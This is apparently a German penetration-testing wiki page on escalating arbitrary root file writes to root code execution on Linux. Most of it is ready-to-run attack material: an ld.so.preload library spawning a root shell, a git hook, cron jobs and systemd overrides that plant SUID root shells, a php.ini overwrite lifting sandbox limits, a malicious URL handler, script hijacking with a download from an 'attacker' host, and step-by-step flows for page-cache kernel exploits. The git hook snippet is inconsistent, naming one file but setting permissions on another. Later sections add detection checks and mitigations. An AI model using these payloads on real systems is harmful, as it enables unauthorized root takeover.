# Beliebiges Schreiben in Dateien als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Diese Datei verhält sich wie die Umgebungsvariable **`LD_PRELOAD`**, funktioniert jedoch auch in **SUID binaries**.\
Wenn du sie erstellen oder ändern kannst, kannst du einfach einen **Pfad zu einer Library, die** bei jeder ausgeführten Binary geladen wird, hinzufügen.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository **ausgeführt** werden, etwa wenn ein Commit erstellt oder ein Merge durchgeführt wird. Wenn also ein **privilegiertes Skript oder ein privilegierter Benutzer** diese Aktionen regelmäßig durchführt und es möglich ist, in den Ordner **`.git`** zu **schreiben**, kann dies für **privesc** verwendet werden.

Zum Beispiel ist es möglich, ein **Skript** in einem Git-Repository unter **`.git/hooks`** zu **erstellen**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron- und Zeitdateien

Wenn du **in Cron-bezogene Dateien schreiben kannst, die von root ausgeführt werden**, kannst du normalerweise Codeausführung erreichen, sobald der Job das nächste Mal ausgeführt wird. Interessante Ziele sind:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Der eigene Crontab von root in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen ausgelösten Services

Schnellprüfungen:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchswege:

- **Einen neuen root cron job an** `/etc/crontab` **oder eine Datei in** `/etc/cron.d/` **anhängen**
- **Ein bereits von** `run-parts` **ausgeführtes Script ersetzen**
- **Ein vorhandenes Timer-Ziel backdooren**, indem das Script oder Binary geändert wird, das es startet

Minimales cron-Payload-Beispiel:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn du nur in ein von `run-parts` verwendetes Cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Hinweise:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten. Verwende daher bevorzugt Namen wie `backup` statt `backup.sh`.
- Einige Distros verwenden `anacron` oder `systemd`-Timer anstelle des klassischen cron, aber die Idee des Missbrauchs bleibt dieselbe: **Ändere, was root später ausführen wird**.

### Service- & Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder von ihnen referenzierte Dateien beschreiben kannst, kannst du möglicherweise Codeausführung als root erreichen, indem du die Unit neu lädst und neu startest oder wartest, bis der Service-/Socket-Aktivierungspfad ausgelöst wird.

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/Binaries, auf die von `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwiesen wird
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnelle Prüfungen:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer root-owned Service-Unit, die du ändern kannst
- **Einen Drop-in-Override hinzufügen** mit einem schädlichen `ExecStart=` und den alten Eintrag vorher löschen
- Das bereits von der Unit referenzierte Script/Binary **backdooren**
- Einen **socket-activated service hijacken**, indem du die zugehörige `.service`-Datei änderst, die gestartet wird, sobald der Socket eine Verbindung empfängt

Beispiel für einen schädlichen Override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Services nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, um die Ausführung des backdoored Service als root auszulösen.

### Eine restriktive, von einer privilegierten PHP-Sandbox verwendete `php.ini` überschreiben

Einige benutzerdefinierte Daemons validieren von Benutzern bereitgestellten PHP-Code, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der sandboxed Code weiterhin über **irgendeine Schreibmöglichkeit** (wie `file_put_contents`) verfügt und du den **exakten `php.ini`-Pfad** erreichen kannst, den der Daemon verwendet, kannst du diese **Konfiguration überschreiben**, um die Einschränkungen aufzuheben, und anschließend einen zweiten Payload übermitteln, der mit erhöhten Privilegien ausgeführt wird.

Typischer Ablauf:

1. Der erste Payload überschreibt die Sandbox-Konfiguration.
2. Der zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der Daemon als root läuft (oder mit Pfaden validiert, die root gehören), ergibt die zweite Ausführung einen root-Kontext. Dies ist im Wesentlichen **Privilege Escalation via Config Overwrite**, wenn die sandboxed Runtime weiterhin Dateien schreiben kann.

### binfmt_misc

Die Datei unter `/proc/sys/fs/binfmt_misc` gibt an, welches Binary welche Dateitypen ausführen soll. TODO: Die Voraussetzungen prüfen, um dies zu missbrauchen und eine Rev Shell auszuführen, wenn ein gängiger Dateityp geöffnet wird.

### Schema-Handler überschreiben (wie http: oder https:)

Ein Angreifer mit Schreibberechtigungen für die Konfigurationsverzeichnisse eines Opfers kann problemlos Dateien ersetzen oder erstellen, die das Systemverhalten ändern, was zu unbeabsichtigter Code Execution führt. Durch die Änderung der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei verweisen (z. B. durch Setzen von `x-scheme-handler/http=evil.desktop`), stellt der Angreifer sicher, dass **das Anklicken eines beliebigen http- oder https-Links den in dieser `evil.desktop`-Datei angegebenen Code ausführt**. Nachdem beispielsweise der folgende bösartige Code in `evil.desktop` unter `$HOME/.local/share/applications` platziert wurde, führt jeder externe URL-Klick den eingebetteten Befehl aus:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Weitere Informationen findest du in [**diesem Beitrag**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), in dem eine reale Schwachstelle ausgenutzt wurde.

### Root führt von Benutzern beschreibbare Skripte/Binärdateien aus

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` ausführt (oder eine beliebige Binärdatei innerhalb eines Verzeichnisses, das einem unprivilegierten Benutzer gehört), kannst du dies hijacken:

- **Ausführung erkennen:** Überwache Prozesse mit [pspy](https://github.com/DominicBreuker/pspy), um zu erkennen, wenn Root benutzerkontrollierte Pfade aufruft:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören bzw. für ihn beschreibbar sind.
- **Ziel hijacken:** Sichere die ursprüngliche Binary/Script-Datei und hinterlege ein payload, das eine SUID-Shell (oder eine andere Root-Aktion) erstellt, und stelle anschließend die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. eine UI-Schaltfläche drücken, die den Helper startet). Wenn root den hijacked Pfad erneut ausführt, die eskalierte Shell mit `./rootshell -p` übernehmen.

### Nur den Page Cache betreffende Änderung privilegierter Binaries

Einige Kernel-Bugs ändern die Datei **nicht auf der Festplatte**. Stattdessen erlauben sie nur, die **Page-Cache-Kopie** einer lesbaren Datei zu ändern. Wenn du ein **setuid**- oder anderweitig **von root ausgeführtes** Binary als Ziel verwenden kannst, führt die nächste Ausführung möglicherweise vom Angreifer kontrollierte Bytes aus dem Speicher aus und eskaliert die Privilegien, obwohl der Datei-Hash auf der Festplatte unverändert ist.

Dies lässt sich als **nur zur Laufzeit wirksames File-Write-Primitive** betrachten:

- **Die Festplatte bleibt sauber**: Inode und Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Page lesen oder ausführen, erhalten den vom Angreifer geänderten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Reboot oder durch die Verdrängung aus dem Cache

Dieses Primitive liegt zwischen einem klassischen **arbitrary file write** und älteren **Page-Cache-Abuse**-Bugs wie Dirty COW / Dirty Pipe:

- Dirty COW basierte auf einer Race Condition
- Dirty Pipe hatte Einschränkungen bezüglich der Schreibposition
- Ein reines Page-Cache-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibvorgänge in gecachte, dateigestützte Pages ermöglicht

#### Generischer privesc-Ablauf

1. Ein Kernel-Primitive erlangen, das in **dateigestützte Page-Cache-Pages** schreiben kann
2. Es gegen ein **lesbares privilegiertes Binary** oder eine andere **von root ausgeführte Datei** einsetzen
3. Die Ausführung **auslösen, bevor** die Page aus dem Cache verdrängt wird
4. Codeausführung als root erlangen, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische Ziele mit hohem Wert:

- **setuid-root**-Binaries
- Helper, die von **root-Services** gestartet werden
- Binaries, die häufig aus **Containern mit gemeinsamem Host-Kernel/Page Cache** ausgeführt werden

#### AF_ALG- und `splice()`-Beispielpfad

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad befand sich in der Linux-Crypto-Userspace-API (`AF_ALG` / `algif_aead`):

- `splice()` kann Referenzen auf Page-Cache-Pages aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- der In-Place-Decrypt-Pfad von `algif_aead` verwendete Source- und Destination-Buffer erneut
- `authencesn` schrieb anschließend in den Destination-Tag-Bereich
- wenn dieser Bereich weiterhin auf spliced, dateigestützte Pages verwies, landete der Schreibvorgang im **Page Cache der Zieldatei**

Die interessante Technik ist also nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als **beschreibbaren Output** zu behandeln
- ein kleines, kontrolliertes Überschreiben im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibvorgänge**, um `/usr/bin/su` im Speicher zu patchen und anschließend auszuführen.

#### ESP / XFRM- und netfilter-TEE-Clone-Beispielpfad

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **Page-Cache-only-write-to-root**-Musters. Diesmal ist das Ziel jedoch die **IPsec-ESP-Entschlüsselung** anstelle von `AF_ALG`.

Die wichtige Technik ist der Schritt des **Metadata-Laundering**:

- `splice()` platziert eine **schreibgeschützte, dateigestützte Page-Cache-Page** in einem ESP-in-UDP-Paket
- die ursprüngliche DirtyFrag-Mitigation markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor der Entschlüsselung eine **Kopie erstellt**
- netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- der Clone behält dieselbe physische Page-Cache-Referenz, verliert aber `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Clone anschließend als sicher und führt die **In-Place-Entschlüsselung von `cbc(aes)`** über die dateigestützte Page aus

Die Lehre für Reviewer geht über die CVE hinaus: Wenn eine Mitigation von **skb-/Page-Metadaten** abhängt, um zu entscheiden, ob eine Operation zuerst eine Kopie erstellen muss, kann jeder **Clone-/Copy-Pfad, der die zugrunde liegende Page beibehält, aber die Metadaten entfernt**, das Write-Primitive unbemerkt wieder öffnen.

Typischer Exploitation-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, um **`CAP_NET_ADMIN` innerhalb eines privaten Network Namespace** zu erhalten
2. Loopback aktivieren und eine **netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. XFRM-ESP-Transport-SAs über `NETLINK_XFRM` installieren
4. jedes Ziel-4-Byte-Word im SA-`seq_hi`-Feld kodieren (DirtyFrags Word-Selection-Trick)
5. das gesplice-te ESP-in-UDP-Paket senden, damit der **TEE-Clone** `esp_input()` erreicht und **In-Place** entschlüsselt wird
6. wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einer anderen privilegierten ausführbaren Datei vom Angreifer kontrollierten Code enthält

Aus praktischer Sicht ist die Auswirkung dieselbe wie im `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt sauber, aber `execve()` verwendet die **veränderten Page-Cache-Bytes** und liefert root.

Nützliche Prüfungen zur Erkennung der Betroffenheit bei dieser Variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Die kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den clone-Pfad, während das Blockieren des Autoloadings von `xt_TEE` den **Flag-Laundering-Schritt** entfernt und das Blockieren von `esp4` / `esp6` den **Decrypt-Sink** entfernt.

#### Exposure und Hunting

Wenn du diese Bug-Klasse vermutest, solltest du dich nicht nur auf Integritätsprüfungen der Festplatte verlassen. Überprüfe außerdem:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen und entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: Das Interface ist in den Kernel integriert
- setuid binaries sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, aus einem lokalen foothold möglicherweise Root-Zugriff machen kann

#### Reduzierung der Angriffsfläche für den `algif_aead`-Pfad

Wenn das verwundbare Interface von einem ladbaren Modul bereitgestellt wird:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Wenn es in den Kernel einkompiliert ist, berichten einige Meldungen, dass der init-Pfad blockiert wird durch:
```bash
initcall_blacklist=algif_aead_init
```
Diese Art der Mitigation sollte auch bei anderen Kernel-LPEs berücksichtigt werden: Wenn die Ausnutzung von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Blacklisting dieser Schnittstelle den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.

## Referenzen

- [HTB Bamboo – Hijacking eines als root ausgeführten Scripts in einem benutzerbeschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall-oss-security-Veröffentlichung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux-Stable-Fix: crypto: algif_aead - Rückkehr zum Betrieb out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy-Fail-Advisory](https://copy.fail/)
- [Technischer Bericht von Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Analyse und Ausnutzung der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Frühere Linux-Mitigation: `SKBFL_SHARED_FRAG` für gesplicete UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
